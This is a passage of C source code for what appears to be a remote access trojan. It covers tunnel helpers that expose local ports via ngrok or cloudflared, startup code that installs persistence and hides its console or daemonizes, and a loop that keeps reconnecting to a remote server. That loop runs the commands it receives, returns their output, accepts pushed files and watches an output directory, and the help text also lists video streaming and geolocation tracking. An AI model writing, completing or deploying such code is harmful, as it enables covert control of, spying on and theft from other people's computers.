        char *cmd = end + 1;
        while (isspace(*cmd)) cmd++;
        end = cmd;
        while (*end && !isspace(*end)) end++;
        *end = '\0';
        
        if (strcmp(cmd, "ngrok") == 0) {
            strcpy(t->tool, "ngrok");
            char *url = get_ngrok_url();
            if (url) {
                strncpy(t->url, url, sizeof(t->url) - 1);
                t->url[sizeof(t->url) - 1] = '\0';
                free(url);
            }
        } else if (strcmp(cmd, "cloudflared") == 0) {
            strcpy(t->tool, "cloudflared");
        } else {
            continue;
        }
        
        // Parse args to extract port
        char *args = end + 1;
        if (strstr(args, "http://localhost:")) {
            char *port_start = strstr(args, "http://localhost:") + strlen("http://localhost:");
            char *port_end = port_start;
            while (*port_end && isdigit(*port_end)) port_end++;
            if (port_end > port_start) {
                size_t len = port_end - port_start;
                if (len > sizeof(t->port) - 1) len = sizeof(t->port) - 1;
                strncpy(t->port, port_start, len);
                t->port[len] = '\0';
            }
        }
        
        count++;
    }

    pclose(fp);
#endif
    return count;
}

// Start a tunnel
static void start_tunnel(const char *tool, const char *port) {
    char cmd[4096];
    char *url = NULL;
    
    if (strcmp(tool, "ngrok") == 0) {
        if (!command_exists("ngrok")) {
            printf("[!] ngrok not found in PATH\n");
            return;
        }
        
        // Check if already running
        if (is_process_running("ngrok.exe") || is_process_running("ngrok")) {
            printf("[*] ngrok is already running. Getting URL...\n");
            url = get_ngrok_url();
            if (!url) {
                printf("[!] Failed to get ngrok URL. Starting new instance...\n");
#ifdef _WIN32
                snprintf(cmd, sizeof(cmd), "start /B \"\" ngrok http %s", port);
#else
                snprintf(cmd, sizeof(cmd), "ngrok http %s > /dev/null 2>&1 &", port);
#endif
                system(cmd);
                
                // Wait and try to get URL
                sleep(3);
                url = get_ngrok_url();
            }
        } else {
#ifdef _WIN32
            snprintf(cmd, sizeof(cmd), "start /B \"\" ngrok http %s", port);
#else
            snprintf(cmd, sizeof(cmd), "ngrok http %s > /dev/null 2>&1 &", port);
#endif
            system(cmd);
            
            // Wait and try to get URL
            printf("Starting ngrok");
            for (int i = 0; i < 15 && !url; i++) {
                printf(".");
                fflush(stdout);
                sleep(2);
                url = get_ngrok_url();
            }
        }
    } 
    else if (strcmp(tool, "cloudflared") == 0) {
        char cf_path[1200];
        bool found = false;
        
        if (command_exists("cloudflared")) {
            found = true;
        } else {
            // Check in our install directory
            char install_dir[1024];
            get_install_dir(install_dir, sizeof(install_dir));
#ifdef _WIN32
            snprintf(cf_path, sizeof(cf_path), "%s\\cloudflared.exe", install_dir);
#else
            snprintf(cf_path, sizeof(cf_path), "%s/cloudflared", install_dir);
#endif
            if (access(cf_path, X_OK) == 0) {
                found = true;
            }
        }
        
        if (!found) {
            printf("[!] cloudflared not found. Run 'tunnel install' first.\n");
            return;
        }
        
        // Check if already running
        if (is_process_running("cloudflared.exe") || is_process_running("cloudflared")) {
            printf("[*] cloudflared is already running\n");
            return;
        }
        
        printf("Starting cloudflared");
        fflush(stdout);
        
#ifdef _WIN32
        snprintf(cmd, sizeof(cmd), "start /B \"\" \"%s\" tunnel --url http://localhost:%s", cf_path, port);
#else
        snprintf(cmd, sizeof(cmd), "\"%s\" tunnel --url http://localhost:%s > /dev/null 2>&1 &", cf_path, port);
#endif
        system(cmd);
        
        // Wait a bit for it to start
        for (int i = 0; i < 10; i++) {
            printf(".");
            fflush(stdout);
            sleep(1);
        }
        
        printf("\n[✔] cloudflared started. Check its output for URL\n");
        return;
    }
    
    if (url) {
        printf("\n[✔] Tunnel created successfully!\n");
        printf("URL: %s\n", url);
        free(url);
    } else {
        printf("\n[!] Failed to get tunnel URL\n");
    }
}

// List running tunnels
static void list_tunnels() {
    printf("Checking for running tunnels...\n\n");
    
    // Check ngrok
    printf("=== ngrok tunnels ===\n");
    if (is_process_running("ngrok.exe") || is_process_running("ngrok")) {
        char *url = get_ngrok_url();
        if (url) {
            printf("URL: %s\n", url);
            free(url);
        } else {
            printf("ngrok is running but URL not available\n");
        }
    } else {
        printf("No ngrok tunnels found\n");
    }
    
    // Check cloudflared
    printf("\n=== cloudflared tunnels ===\n");
    if (is_process_running("cloudflared.exe") || is_process_running("cloudflared")) {
        printf("cloudflared is running\n");
        printf("Note: The URL was displayed when the tunnel was started\n");
    } else {
        printf("No cloudflared tunnels found\n");
    }
}

// Close a tunnel
static void close_tunnel(int pid) {
    if (kill_process(pid)) {
        printf("[✔] Tunnel with PID %d has been terminated\n", pid);
    } else {
        printf("[!] Failed to terminate tunnel with PID %d\n", pid);
    }
}

// Print help information
static void print_help() {
    printf("Available commands:\n");
    printf("  stream                    - Start video streaming server\n");
    printf("  geolocation              - Start geolocation tracker\n");
    printf("  tunnel install           - Install cloudflared\n");
    printf("  tunnel list              - List running tunnels\n");
    printf("  tunnel close <pid>       - Close a tunnel by PID\n");
    printf("  tunnel expose -p<port> -c - Expose port using cloudflared\n");
    printf("  tunnel expose -p<port> -n - Expose port using ngrok\n");
    printf("  help                     - Show this help\n");
    printf("  exit                     - Exit the program\n");
}

// Process tunnel expose command
static void process_tunnel_expose(int argc, char **argv) {
    char *port = NULL;
    char *tool = NULL;
    
    for (int i = 2; i < argc; i++) {
        if (strncmp(argv[i], "-p", 2) == 0) {
            if (strlen(argv[i]) > 2) {
                port = argv[i] + 2;
            } else if (i + 1 < argc) {
                port = argv[++i];
            }
        } else if (strcmp(argv[i], "-c") == 0) {
            tool = "cloudflared";
        } else if (strcmp(argv[i], "-n") == 0) {
            tool = "ngrok";
        }
    }
    
    if (!port) {
        printf("Error: port not specified. Use -p<port> or -p <port>\n");
        return;
    }
    
    if (!tool) {
        printf("Error: tool not specified. Use -c for cloudflared or -n for ngrok\n");
        return;
    }
    
    start_tunnel(tool, port);
}

// Process tunnel close command
static void process_tunnel_close(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: tunnel close <pid>\n");
        return;
    }
    
    int pid = atoi(argv[2]);
    if (pid <= 0) {
        printf("Invalid PID\n");
        return;
    }
    
    close_tunnel(pid);
}

// Update the process_tunnel_command function to match the expected signature
void process_tunnel_command(char **args) {
    // Convert the args to argc and argv for internal processing
    int argc = 0;
    while (args[argc] != NULL) {
        argc++;
    }
    
    if (argc < 2) {
        printf("Usage: tunnel <command>\n");
        printf("Commands: install, list, close, expose\n");
        return;
    }
    
    if (strcmp(args[1], "install") == 0) {
        install_cloudflared();
    } else if (strcmp(args[1], "list") == 0) {
        list_tunnels();
    } else if (strcmp(args[1], "close") == 0) {
        process_tunnel_close(argc, args);
    } else if (strcmp(args[1], "expose") == 0) {
        process_tunnel_expose(argc, args);
    } else {
        printf("Unknown tunnel command: %s\n", args[1]);
    }
}

// ==================== MAIN FUNCTION ====================

int main(int argc, char *argv[]) {
    // Generate unique client ID based on hostname and random number
    char hostname[256];
    #ifdef _WIN32
        DWORD size = sizeof(hostname);
        GetComputerNameA(hostname, &size);
    #else
        gethostname(hostname, sizeof(hostname));
    #endif
    srand(time(NULL));
    snprintf(client_id, sizeof(client_id), "%s-%d", hostname, rand() % 10000);
    
    // Initialize to root directory on Windows
    #ifdef _WIN32
        strcpy(current_dir, "C:\\");
        chdir("C:\\");
    #else
        char *home = getenv("HOME");
        if (home != NULL) {
            strncpy(current_dir, home, sizeof(current_dir) - 1);
            current_dir[sizeof(current_dir) - 1] = '\0';
            chdir(home);
        } else {
            strcpy(current_dir, "/");
            chdir("/");
        }
    #endif
    
    // Verify directory
    char verify_dir[MAX_PATH_LENGTH];
    if (getcwd(verify_dir, sizeof(verify_dir)) != NULL) {
        strncpy(current_dir, verify_dir, sizeof(current_dir) - 1);
        current_dir[sizeof(current_dir) - 1] = '\0';
    }
    
    // Create output directories
    create_output_directories();
    
    #ifdef _WIN32
        CoInitialize(NULL);
    #else
        // Initialize HTTP for non-Windows platforms
        init_http();
    #endif
    
    // Process command line arguments
    int run_command_mode = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--minimized") == 0) {
            background_mode = 1;
        } else {
            run_command_mode = 1;
        }
    }
    
    // Install persistence
    install_persistence();
    
    // Determine operation mode
    if (background_mode) {
        // Background mode - connect to server and handle commands
        run_in_background();
        // This function never returns
        return 0;
    }
    else if (!has_console()) {
        // No console available - run in background
        background_mode = 1;
        run_in_background();
        // This function never returns
        return 0;
    }
    else if (run_command_mode) {
        // Command line mode - execute command and exit
        char *args[MAX_COMMAND_LENGTH / 2 + 1];
        int arg_count = 0;
        
        for (int i = 1; i < argc && arg_count < MAX_COMMAND_LENGTH / 2; i++) {
            if (strcmp(argv[i], "--minimized") != 0) {
                args[arg_count++] = argv[i];
            }
        }
        args[arg_count] = NULL;
        
        if (arg_count > 0) {
            int found = 0;
            for (int i = 0; commands[i].name != NULL; i++) {
                if (strcmp(args[0], commands[i].name) == 0) {
                    commands[i].func(args + 1);
                    found = 1;
                    break;
                }
            }
            
            if (!found) {
                printf("Unknown command: %s\n", args[0]);
                printf("Type 'help' for available commands\n");
            }
        }
        
        #ifdef _WIN32
            CoUninitialize();
        #else
            cleanup_http();
        #endif
        return 0;
    }
    // NOW switch to background mode AFTER message is dismissed
    background_mode = 1;
    run_in_background();
    // This function never returns
    return 0;
   }

// Run in background mode - improved version
void run_in_background() {
    background_mode = 1;
    
    // Force correct directory
    #ifdef _WIN32
        chdir("C:\\");
        strcpy(current_dir, "C:\\");
        
        // Hide console
        FreeConsole();
    #else
        char *home = getenv("HOME");
        if (home != NULL) {
            chdir(home);
            strncpy(current_dir, home, sizeof(current_dir) - 1);
        } else {
            chdir("/");
            strcpy(current_dir, "/");
        }
        
        // Daemonize process
        pid_t pid = fork();
        if (pid > 0) {
            // Parent process - exit
            exit(0);
        }
        if (pid < 0) {
            // Fork failed
            exit(1);
        }
        
        // Child process continues
        setsid(); // Create new session
        
        // Fork again to ensure we're not session leader
        pid = fork();
        if (pid > 0) {
            exit(0);
        }
        if (pid < 0) {
            exit(1);
        }
        
        // Change to root directory to avoid blocking unmounts
        chdir("/");
        
        // Close standard file descriptors
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        
        // Redirect to /dev/null
        open("/dev/null", O_RDONLY); // stdin
        open("/dev/null", O_WRONLY); // stdout
        open("/dev/null", O_WRONLY); // stderr
    #endif
    
    // Verify directory
    char verify_dir[MAX_PATH_LENGTH];
    if (getcwd(verify_dir, sizeof(verify_dir)) != NULL) {
        strncpy(current_dir, verify_dir, sizeof(current_dir) - 1);
        current_dir[sizeof(current_dir) - 1] = '\0';
    }
    
    // Start server connection loop - this runs forever
    maintain_server_connection();
    
    // Should never reach here
    #ifdef _WIN32
        CoUninitialize();
    #else
        cleanup_http();
    #endif
    exit(0);
}

// Maintain server connection with continuous retrying - improved version
void maintain_server_connection() {
    int connection_attempts = 0;
    int max_retry_delay = 300; // Maximum 5 minutes between retries
    
    while (1) {
        if (!connected_to_server) {
            connection_attempts++;
            
            // Check if we should use socket connection
            if (strcmp(server_url, "EMPTY") == 0) {
                use_socket_connection = 1;
                
                // Try to connect using socket
                if (connect_to_remote_server_socket()) {
                    connection_attempts = 0; // Reset counter on successful connection
                    
                    // Start file monitoring when connected
                    file_monitoring_active = 1;
                    pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
                    
                    // Handle remote commands - this blocks until connection is lost
                    handle_remote_commands_socket();
                    
                    // If we get here, connection was lost
                    connected_to_server = 0;
                    file_monitoring_active = 0;
                    pthread_join(file_monitor_thread, NULL);
                }
            } else {
                use_socket_connection = 0;
                
                // Try to connect using HTTP
                if (connect_to_remote_server()) {
                    connection_attempts = 0; // Reset counter on successful connection
                    
                    // Start file monitoring when connected
                    file_monitoring_active = 1;
                    pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
                    
                    // Handle remote commands - this blocks until connection is lost
                    handle_remote_commands();
                    
                    // If we get here, connection was lost
                    connected_to_server = 0;
                    file_monitoring_active = 0;
                    pthread_join(file_monitor_thread, NULL);
                }
            }
        }
        
        // Calculate retry delay with exponential backoff
        int retry_delay = CONNECTION_RETRY_INTERVAL;
        if (connection_attempts > 1) {
            retry_delay = CONNECTION_RETRY_INTERVAL * (1 << (connection_attempts - 1));
            if (retry_delay > max_retry_delay) {
                retry_delay = max_retry_delay;
            }
        }
        
        // Wait before retrying
        sleep(retry_delay);
    }
}

// Handle remote commands - improved version with proper output capture
void handle_remote_commands() {
    char buffer[BUFFER_SIZE];
    
    while (connected_to_server) {
        memset(buffer, 0, BUFFER_SIZE);
        
        // Poll for commands
        receive_from_server(buffer, BUFFER_SIZE - 1);
        
        // If no data received or empty response, wait and continue
        if (strlen(buffer) == 0) {
            sleep(1);
            continue;
        }
        
        // Check for special commands
        if (strncmp(buffer, "send ", 5) == 0) {
            // File transfer from server to client
            char *file_path_arg = strtok(buffer + 5, " ");
            char *file_size_arg = strtok(NULL, " ");
            
            if (file_path_arg && file_size_arg) {
                char file_path[MAX_PATH_LENGTH];
                strncpy(file_path, file_path_arg, sizeof(file_path) - 1);
                
                // Download file from server
                receive_file_from_server(file_path);
            }
            continue;
        }
        
        // Parse command into arguments
        char *token;
        char *args[MAX_COMMAND_LENGTH / 2 + 1];
        int arg_count = 0;
        
        // Create a copy of buffer for tokenization
        char buffer_copy[BUFFER_SIZE];
        strncpy(buffer_copy, buffer, BUFFER_SIZE - 1);
        
        token = strtok(buffer_copy, " \t\n");
        while (token != NULL && arg_count < MAX_COMMAND_LENGTH / 2) {
            args[arg_count++] = token;
            token = strtok(NULL, " \t\n");
        }
        args[arg_count] = NULL;
        
        if (arg_count == 0) {
            continue;
        }
        
        // Create output buffer for capturing command output
        g_output_buffer = create_output_buffer();
        
        // Execute command
        int found = 0;
        for (int i = 0; commands[i].name != NULL; i++) {
            if (strcmp(args[0], commands[i].name) == 0) {
                commands[i].func(args + 1);
                found = 1;
                break;
            }
        }
        
        if (!found) {
            append_to_buffer(g_output_buffer, "ERROR: Unknown command: ");
            append_to_buffer(g_output_buffer, args[0]);
            append_to_buffer(g_output_buffer, "\n");
        }
        
        // Send captured output to server
        if (g_output_buffer->size > 0) {
            send_to_server(g_output_buffer->data);
        }
        
        // Clean up
        free_output_buffer(g_output_buffer);
        g_output_buffer = NULL;
        
        // Send command completion marker
        send_to_server("COMMAND_COMPLETE\n");
        
        // Small delay to prevent flooding
        usleep(100000); // 100ms
    }
}

// Connect to remote server - improved version
int connect_to_remote_server() {
    // Test connection by sending a simple request
    char test_url[MAX_PATH_LENGTH];
    snprintf(test_url, sizeof(test_url), "%s/test", server_url);
    
    http_response_t response = http_get(test_url);
    
    int success = 0;
    if (response.size > 0) {
        // Connection successful - send initial connection message
        char init_msg[MAX_PATH_LENGTH + 20];
        snprintf(init_msg, sizeof(init_msg), "CONNECTED:%s", current_dir);
        send_to_server(init_msg);
        
        connected_to_server = 1;
        success = 1;
    }
    
    free_http_response(&response);
    return success;
}
